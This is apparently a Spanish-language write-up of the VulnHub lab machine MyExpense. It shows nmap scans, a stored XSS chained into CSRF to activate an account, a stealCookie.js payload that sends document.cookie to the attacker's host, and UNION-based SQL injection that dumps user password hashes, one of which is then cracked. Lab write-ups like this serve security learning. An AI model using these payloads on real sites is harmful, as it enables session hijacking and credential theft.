---
title: MyExpense - VulnHub Machine
description: "Máquina linux de la plataforma VulnHub, donde se puede practicar XSS y SQLI"
date: 2023-10-25
pubDate: 2023-10-25
image: /image/vh-writeup-myexpense/portada-myexpense.png
categories:
  - VulnHub
  - writeup
tags:
  - sql
  - sqli
  - xss
  - session
  - hijacking
  - linux
---

MyExpense es una máquina linux de [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/#top) y a diferencia de las máquinas de [HackTheBox](https://www.hackthebox.com/), su finalidad no es la de llegar a ser root en el servidor comprometido.

En este caso, somos un "Samuel Lamotte", ex-empleado de una empresa la cual nos ha despedido y encima, no nos han tramitado un pago que nos deben. Nuestro objetivo será infiltrarnos en el sistema para que el pago se lleve a cabo.

La única pista que nos dan es: ```samuel/fzghn4lw```, lo cual parecen unas credenciales.

## Índice
- [Índice](#índice)
- [Fase de reconocimiento](#fase-de-reconocimiento)
  - [Reconocimiento de puertos y servicios](#reconocimiento-de-puertos-y-servicios)
  - [Reconocimiento web](#reconocimiento-web)
- [Fase de explotación](#fase-de-explotación)
  - [Nos logeamos como en slamotte](#nos-logeamos-como-en-slamotte)
  - [Nos convertimos en mriviere](#nos-convertimos-en-mriviere)
  - [Nos convertimos en pbaudouin](#nos-convertimos-en-pbaudouin)

<a id="reconocimiento"></a>
## Fase de reconocimiento

>Mientras hacía la máquina tuve que reiniciarla, así que en este post, la máquina atacante tendrá dos Ips: 10.0.2.9 y 10.0.2.10

### Reconocimiento de puertos y servicios

Empezaremos utilizando nmap para descubrir los puertos abiertos accesibles.
```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -v 10.0.2.9 -oG allPort
```
allPorts:

```bash 
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.2.9 ()   Status: Up
Host: 10.0.2.9 ()   Ports: 80/open/tcp//http///, 37761/open/tcp/////, 41843/open/tcp/////, 42307/open/tcp/////, 53407/open/tcp///// Igno
red State: closed (65530)
# Nmap done at Mon Oct 23 18:02:42 2023 -- 1 IP address (1 host up) scanned in 2.72 seconds
```

Una vez escaneados los puertos, escanearemos más en profundidad para ver que servicios usan y sus respectivas versiones.

```bash
nmap -p80,37761,41843,42307,53407 -sCV 10.0.2.9 -v -oN targeted
# Nmap 7.93 scan initiated Mon Oct 23 18:04:16 2023 as: nmap -p80,37761,41843,42307,53407 -sCV -v -oN targeted 10.0.2.9
Nmap scan report for 10.0.2.9 (10.0.2.9)
Host is up (0.00069s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
|_http-favicon: Unknown favicon MD5: 9B033BAF87652377BA32FF57F736E439
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
37761/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST
41843/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST
42307/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST
53407/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 18:04:23 2023 -- 1 IP address (1 host up) scanned in 7.26 seconds
```

Como podemos ver, el servidor tiene el puerto 80 con el servicio *http*. Es más, existe una ruta llamada ```/admin/admin.php``` que tiene una cookie de *PHPSESSION* que tiene la flag http-only deshabilitada.

Esta flag puede ser crucial si se produce un [XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), ya que nos puede permitir hacer un [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking).


<a id="reconocimiento-web"></a>
### Reconocimiento web

Podemos acceder a la página ```/admin/admin.php``` sin logearnos y podemos ver una serie de usuarios.

<a id="explotacion"></a>

## Fase de explotación

Entre estos usuarios podemos ver al nuestro: slamotte. Sin embargo, si intentamos logearnos nos dice que no podemos entrar en esta porque la cuenta está inactiva.

Por lo tanto intentamos crear una nueva, pero por defecto aparece inactiva.

Como el login nos permite escribir un input(el FirstName y el LastName) que luego se refleja en ```/admin/admin.php```, intentamos probar un **XSS**. Creamos un usuario con el FirstName: ```<marquee>Hacked</marquee>```. Cuando vamos a *admin.php* podemos ver que se mueve el texto. Por lo tanto, estamos ante un **XSS**.

Si le damos a activar una cuenta, nos redirigirá a una página diciendo que no tenemos privilegios para hacerlo. Esta petición se hace por *GET* y podemos ver en la URL que se tramita de la siguiente manera: 
```
http://<ip de la maquina>/admin/admin.php?id=11&status=active
```
El campo id es el id del usuario al que queremos activar y el status es al estado al que queremos cambiarlo.

<a id="slamotte"></a>
### Nos logeamos como en slamotte

Si logramos que el administrador realice esta petición activará la cuenta. Esto lo podremos conseguir derivando el **XSS** anterior en un [CSRF(Cross Site Request Forgery)](https://owasp.org/www-community/attacks/csrf).

La idea es que vamos a hacer que el administrador cargue un código malicioso *js* gracias al **XSS**. Este script va a realizar una petición XML a la URL de activarnos la cuenta.

pwned.js:

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://<ip de la máquina>/admin/admin.php?id=11&status=active');
request.send();
```

Ahora creamos un usuario con el siguiente FirstName:
```html
<script src="http://<mi ip>/pwned.js"></script>
```

Iniciamos un servicio *http* con el puerto 80 en la carpeta en la que tenemos el archivo. Yo lo hago con python desde consola de la siguiente manera:
```py
python -m http.server 80
```

En un momento dado, vemos que hemos recibido una petición *GET* del recurso ```/pwned.js```. Si recargamos la página vemos que el usuario **slamotte** está activo y nos logueamos con las credenciales que teníamos. 

![](/image/vh-writeup-myexpense/slamotte.png)

Una vez como slamotte, podemos ver una especie de chat donde varios usuarios han escrito mensajes. 

Si nos vamos al apartado del perfil, podemos ver quién es nuestro mánager: Manon Riviere (mriviere)

![](/image/vh-writeup-myexpense/whoisManager.png)

Si alguien tiene que tramitar nuestro pago, por lógica tiene que ser él. Por lo tanto tenemos que ver la forma de que nos acepte el pago.

<a id="mriviere"></a>
### Nos convertimos en mriviere

Si intentamos inyectar html en el chat, podremos observar que se produce un *XSS*. La idea aquí será robar las cookie de sesión de la persona que vea el mensaje y probar suerte de que mriviere caiga en nuestra trampa.

Para ello referenciaré un script en *js* llamado ```stealCookie.js```:

```html
<script src="http://<mi ip>/stealCookie.js"></script>
```

![](/image/vh-writeup-myexpense/messageStealCookie.png)


stealCookie.js:
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://<mi ip>:4646/cookie=' + document.cookie);
request.send();
```

En este código, se tramita una petición *GET* a nuestra ip con un parámetro llamado cookie donde irá la cookie de la víctima que ejecute este *js*.

> Como se puede observar, esta vez uso el puerto 4646. Esto se debe a que el usuario administrador que visita continuamente a la página ```admin/admin.php``` que nos activó la cuenta de slamotte está continuamente haciendo una petición a nuestro puerto 80. Así que por simplificación usaremos otro puerto.

Iniciamos un servicio *http* con el puerto 4646 en la carpeta en la que tenemos el archivo y esperamos las respuestas:
```py
python -m http.server 4646
```

Una vez hecho esto, obtendremos una serie de cookies de diferentes usuarios. Iremos probando una a una hasta dar con **mriviere**.

![](/image/vh-writeup-myexpense/mriviereReport.png)

Aquí podemos ver la petición del pago y le damos a aceptar. 

Pero esto no es suficiente, todavía lo tiene que revisar el superior de este usuario. Si nos vamos a su usuario lo encontraremos:

![](/image/vh-writeup-myexpense/whoisManagerOfManager.png)

En las cookies anteriores se encuentra este usuario. Sin embargo, como es un administrador, aparece una alerta de que no pueden haber dos sesiones abiertas de un administrador. Por lo tanto, tenemos que intentar llegar a él de otra forma.

![](/image/vh-writeup-myexpense/mgmNoMeDeja.png)

<a id="pbaudouin"></a>
### Nos convertimos en pbaudouin

Si nos vamos al apartado *Rennes*, podremos ver una lista de elmentos. Si nos fijamos en la url, hay un parámetro llamado **id**. Podemos intentar probar un [SQLI (SQL Injection)](https://portswigger.net/web-security/sql-injection) escribiendo ```?id=2 or sleep(5)``` podremos observar como la página se queda cargando durante un buen rato así que podemos decir que funciona.

> El apartado *Rennes* estará disponible siempre que estemos logueados como mriviere

![](/image/vh-writeup-myexpense/sqliDetection.png)

Hacemos un **union select** para ver en que parte de la interfaz se puede ver la inyección:

```sql
?id=2 union select 1,2-- -
```
![](/image/vh-writeup-myexpense/firstUnionSelect.png)

Listamos las bases de datos:

```sql
?id=2 union select 1,schema_name from information_schema.schemata-- -
```
![](/image/vh-writeup-myexpense/databases.png)

Listamos las tablas de la base de datos *myexpense*:

```sql
?id=2 union select 1,table_name from information_schema.tables where table_schema='myexpense'-- -
```
![](/image/vh-writeup-myexpense/tables.png)

Listamos las columnas de la tabla user de la base de datos *myexpense*:

```sql
?id=2 union select 1,colunm_name from information_schema.columns where table_schema='myexpense' and table_name='user'-- -
```
![](/image/vh-writeup-myexpense/columns.png)

Listamos los usuarios con sus contraseñas:

```sql
?id=2 union select 1,group_concat(username,0x3a,password) from user-- -
```
> 0x3a es la representación del carácter (:). Esto lo hacemos para que no nos de problema con el url-encode y nos muestre los datos en formato username:pasword

![](/image/vh-writeup-myexpense/passwordsSQLI.png)

Por lo tanto tenemos las contraseñas de todos los usuarios:

```
afoulon:124922b5d61dd31177ec83719ef8110a
pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
mnguyen:f7111a83d50584e3f91d85c3db710708
pgervais:2ba907839d9b2d94be46aa27cec150e5
placombe:04d1634c2bfffa62386da699bb79f191
triou:6c26031f0e0859a5716a27d2902585c7
broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
brenaud:2204079caddd265cedb20d661e35ddc9
slamotte:21989af1d818ad73741dfdbef642b28f
nthomas:a085d095e552db5d0ea9c455b4e99a30
vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
rmasson:ebfc0985501fee33b9ff2f2734011882
```

A nosotros nos interesa:
```
pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
```

Si metemos esta contraseña encriptada en [CrackStation](https://crackstation.net/), nos dará como resultado ```HackMe```.

![](/image/vh-writeup-myexpense/crackStation.png)

Ahora que sabemos cual es la contraseña de la persona que nos tiene que tramitar el pago, volvemos a la página web, nos logueamos con sus credenciales y aceptamos el pago.

Con esto, el objetivo de la máquina fue completado y por lo tanto la hemos terminado. De todas formas si quieres ver una flag puedes volver a loguearte como slamotte y te aparecerá una notificación con un mensaje de enhorabuena.



